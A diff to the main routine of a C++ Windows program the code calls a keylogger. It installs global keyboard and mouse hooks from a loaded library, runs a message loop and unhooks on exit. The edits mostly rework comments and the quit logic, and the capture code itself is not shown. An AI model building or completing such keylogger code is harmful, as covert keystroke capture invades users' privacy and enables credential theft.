@@ -84,27 +84,29 @@ int _tmain(int argc, TCHAR* argv[])
     // Install the procedures
     installGlobalHooks(lib);
 
+    // Architecture
+    // x86 must execute 64 bit code => code is run in this application => logfile created here
+    // x64 can execute 64 bit code = > code is run in the other application = > separate logfile!
+
     MSG message;
     // GetMessage retrieves a message from the calling thread's message queue. 
     // The function dispatches incoming sent messages until a posted message is available for retrieval.
     while (GetMessage(&message, NULL, 0, 0))
     {
+
         // TranslateMessage translates virtual-key messages into character messages. 
         // The character messages are posted to the calling thread's message queue, to be read the next time the thread calls the GetMessage
         TranslateMessage(&message);
 
-        //DispatchMessage dispatches a message to a window procedure.It is typically used to dispatch a message retrieved by the GetMessage function.
+        // DispatchMessage dispatches a message to a window procedure.
+        // It is typically used to dispatch a message retrieved by the GetMessage function.
         DispatchMessage(&message);
     }
 
-    tcout << TEXT("Press 'Q' to quit") << std::endl;
-    int ch = ' ';
-    while (ch != 'Q') {
-        ch = _gettch();
-        ch = toupper(ch);
-    }
-
     // Stop the keylogger
+    
+    // TODO: how do we break the message loop?
+    tcout << "Closing" << std::endl;
     FreeLibrary(lib);
     UnhookWindowsHookEx(hookKeyboard);
     UnhookWindowsHookEx(hookMouse);
